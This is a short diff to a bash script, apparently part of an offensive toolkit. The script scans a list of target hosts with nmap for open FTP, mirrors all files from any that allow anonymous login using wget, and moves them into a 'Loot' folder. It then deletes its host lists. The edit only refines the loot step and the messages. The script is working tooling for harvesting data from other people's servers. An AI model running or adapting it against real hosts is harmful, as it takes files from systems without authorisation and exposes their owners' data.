@@ -52,21 +52,20 @@ while read Host;
 do
 
     # Check FTP is reachable on target machine
-    if nmap -p 21 $Host | grep "open";
+    if nmap -p 21 $Host | grep -q "open";
     then
         #
         wget -m --no-passive ftp://anonymous:anonymous@$Host &> /dev/null
         echo -e "${GREEN}[FTP]${WHITE} Some files were extracted from $Host."
+        #
+        mv $Host Loot/
     else
         echo -e "${RED}[FTP]${WHITE} FTP wasn't detected on $Host." 
     fi
-    
-    #
-    mv $Host Loot/
 done < TargetHosts.txt
 
 # Cleanup
-echo -e "${YELLOW}[WARNING]${WHITE} Removing temporary files"
+echo "" && echo -e "${YELLOW}[WARNING]${WHITE} Cleaning up."
 
 rm ScannedHosts.txt
 rm TargetHosts.txt
